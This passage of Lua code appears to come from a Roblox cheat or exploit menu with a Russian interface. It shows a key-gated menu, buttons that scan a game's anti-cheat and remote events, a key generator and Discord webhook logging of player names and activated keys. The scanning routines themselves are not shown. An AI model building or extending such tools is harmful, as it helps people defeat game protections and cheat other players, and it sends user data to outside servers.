                if target == "Denis13081989" or target == _b then table.insert(roles, "OWNER") end
                if HasRole(F_DeputyOwner, target) then table.insert(roles, "Зам. Овнера") end
                if HasRole(F_Curator, target) then table.insert(roles, "Куратор") end
                if HasRole(F_StaffLeader, target) then table.insert(roles, "Стафф Лидер") end
                if HasRole(F_TechAdmin, target) then table.insert(roles, "Тех Админ") end
                if HasRole(F_Admin, target) then table.insert(roles, "Админ") end
                if HasRole(F_Tester, target) then table.insert(roles, "Тестер") end
                if HasRole(F_VIP, target) then table.insert(roles, "VIP") end
                if HasRole(F_Banned, target) then table.insert(roles, "ЗАБАНЕН") end
                local roleStr = #roles > 0 and table.concat(roles, ", ") or "Нет ролей"
                local regDate = os.date("%d.%m.%Y", os.time() - (p.AccountAge * 86400))
                local txt = "👤 Игрок: "..p.Name.."\n🆔 UserID: "..p.UserId.."\n📅 Дата рег: "..regDate.."\n⭐ Роли: "..roleStr
                checkResult.Text = txt
            else checkResult.Text = "Игрок не найден." end
        end)
        
        CreateButton(CheckerPage, "🛡️ Сканировать Античит", Color3.fromRGB(150, 50, 50), function() checkResult.Text = ScanAntiCheat() end)
        CreateButton(CheckerPage, "📡 Сканер Remotes", Color3.fromRGB(50, 150, 150), function() checkResult.Text = ScanRemotes(); pcall(function() setclipboard(checkResult.Text) end) end)
    end

    -- ВКЛАДКА 9: КЛЮЧИ
    if isOwner then
        CreateTab("🔑 Ключи", KeyPage)
        local keyBox = Instance.new("TextBox", KeyPage); keyBox.Size = UDim2.new(1, -10, 0, 35); keyBox.BackgroundColor3 = Color3.fromRGB(10, 10, 12); keyBox.PlaceholderText = "Ключ..."; keyBox.TextColor3 = Color3.fromRGB(50, 200, 50); keyBox.Font = Enum.Font.Code; keyBox.TextEditable = false; Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 4)
        
        local function GenKey(days, roleName)
            local hash = "" for i = 1, 12 do hash = hash .. string.format("%x", math.random(0, 15)) end
            local newKey = string.gsub(roleName, " ", "") .. "_KEY_" .. hash
            local expTime = days == 0 and 0 or (os.time() + (days * 86400))
            _w(F_Keys, _r(F_Keys) .. "|" .. newKey .. "|" .. expTime .. "|" .. roleName .. "|")
            keyBox.Text = newKey; pcall(function() setclipboard(newKey) end)
        end
        
        local function MiniBtn(p, text, callback) local b = Instance.new("TextButton", p); b.Size = UDim2.new(0.32, -2, 1, 0); b.BackgroundColor3 = Color3.fromRGB(150, 50, 150); b.Text = text; b.TextColor3 = Color3.fromRGB(255,255,255); b.Font = Enum.Font.GothamBold; b.TextSize = 11; Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4); b.MouseButton1Click:Connect(callback) end
        local row1 = Instance.new("Frame", KeyPage); row1.Size = UDim2.new(1, -10, 0, 35); row1.BackgroundTransparency = 1; Instance.new("UIListLayout", row1).FillDirection = Enum.FillDirection.Horizontal; Instance.new("UIListLayout", row1).Padding = UDim.new(0, 4)
        MiniBtn(row1, "VIP 30д", function() GenKey(30, "VIP") end)
        MiniBtn(row1, "Тестер", function() GenKey(0, "Tester") end)
        MiniBtn(row1, "Админ", function() GenKey(0, "Admin") end)
        MiniBtn(row1, "Модер", function() GenKey(0, "Mod") end)
    end

    -- ВКЛАДКА 10: ПАНЕЛЬ ОВНЕРА
    if isOwner then
        CreateTab("👑 Овнер", OwnerPage)
        CreateButton(OwnerPage, "🧹 Очистить логи", Color3.fromRGB(150, 150, 150), function() _w(F_Logs, ""); SendDiscordLog(WEBHOOK_MAIN, "🧹 Логи очищены", "Овнером", 3447003) end)
        CreateButton(OwnerPage, "⚠️ Снять роли со всех (Паника)", Color3.fromRGB(200, 30, 30), function()
            for _, p in pairs(Players:GetPlayers()) do if p.Name ~= _b then RevokeAllRoles(p.Name) end end
        end)
    end

    -- МОБИЛЬНЫЙ ФИКС
    task.spawn(function()
        while task.wait(0.5) do
            local touchGui = PlayerGui:FindFirstChild("TouchGui")
            if touchGui then
                if not touchGui.Enabled then touchGui.Enabled = true end
                local touchFrame = touchGui:FindFirstChild("TouchControlFrame")
                if touchFrame and not touchFrame.Visible then touchFrame.Visible = true end
            end
            if workspace.CurrentCamera.CameraType ~= Enum.CameraType.Custom then
                workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            end
        end
    end)
end

-- ==========================================
-- 6. ЗАПУСК
-- ==========================================
if isOwner then
    _G.KeyExpiry = math.huge
    StartMenu("Owner")
else
    local KeyGui = Instance.new("ScreenGui", PlayerGui)
    KeyGui.Name = "KillerKeyGate"; KeyGui.ResetOnSpawn = false; KeyGui.DisplayOrder = 9999
    
    local KeyFrame = Instance.new("Frame", KeyGui)
    KeyFrame.Size = UDim2.new(0, 320, 0, 200); KeyFrame.Position = UDim2.new(0.5, -160, 0.5, -100)
    KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25); Instance.new("UICorner", KeyFrame).CornerRadius = UDim.new(0, 8); Instance.new("UIStroke", KeyFrame).Color = Color3.fromRGB(255, 50, 50)

    local KeyTitle = Instance.new("TextLabel", KeyFrame); KeyTitle.Size = UDim2.new(1, 0, 0, 40); KeyTitle.BackgroundTransparency = 1; KeyTitle.Text = "🔒 Введите ключ"; KeyTitle.TextColor3 = Color3.fromRGB(255, 255, 255); KeyTitle.Font = Enum.Font.GothamBold; KeyTitle.TextSize = 18
    local KeyInput = Instance.new("TextBox", KeyFrame); KeyInput.Size = UDim2.new(0.9, 0, 0, 40); KeyInput.Position = UDim2.new(0.05, 0, 0, 50); KeyInput.BackgroundColor3 = Color3.fromRGB(10, 10, 12); KeyInput.PlaceholderText = "Ключ доступа"; KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255); Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 4)
    local KeyBtn = Instance.new("TextButton", KeyFrame); KeyBtn.Size = UDim2.new(0.9, 0, 0, 40); KeyBtn.Position = UDim2.new(0.05, 0, 0, 105); KeyBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50); KeyBtn.Text = "Активировать"; KeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255); KeyBtn.Font = Enum.Font.GothamBold; Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 4)
    local StatusText = Instance.new("TextLabel", KeyFrame); StatusText.Size = UDim2.new(1, 0, 0, 20); StatusText.Position = UDim2.new(0, 0, 1, -20); StatusText.BackgroundTransparency = 1; StatusText.Text = ""; StatusText.TextColor3 = Color3.fromRGB(255, 50, 50); StatusText.Font = Enum.Font.Gotham; StatusText.TextSize = 11

    KeyBtn.MouseButton1Click:Connect(function()
        local cleanInput = string.upper(string.gsub(KeyInput.Text, "^%s*(.-)%s*$", "%1"))
        local isValid, roleOrError, expiry = CheckKey(cleanInput, false)
        
        if isValid then
            StatusText.TextColor3 = Color3.fromRGB(50, 200, 50); StatusText.Text = "Успешно! Загрузка..."
            KeyBtn.Text = "Загрузка..."; KeyBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
            task.wait(0.5)
            
            local expStr = expiry == math.huge and "0" or tostring(expiry)
            _w(F_Session, "|" .. LocalPlayer.Name .. "|" .. roleOrError .. "|" .. expStr .. "|")
            _add(F_VIP, LocalPlayer.Name)
            
            SendDiscordLog(WEBHOOK_REGISTER, "🆕 НОВАЯ РЕГИСТРАЦИЯ", "**Игрок:** `" .. LocalPlayer.Name .. "`\n**Активировал ключ:** `" .. cleanInput .. "`\n**Выдана роль:** " .. roleOrError, 65280)
            
            KeyGui:Destroy()
            StartMenu(roleOrError)
        else 
            StatusText.TextColor3 = Color3.fromRGB(255, 50, 50); StatusText.Text = "Ошибка: " .. tostring(roleOrError)
        end
    end)
end
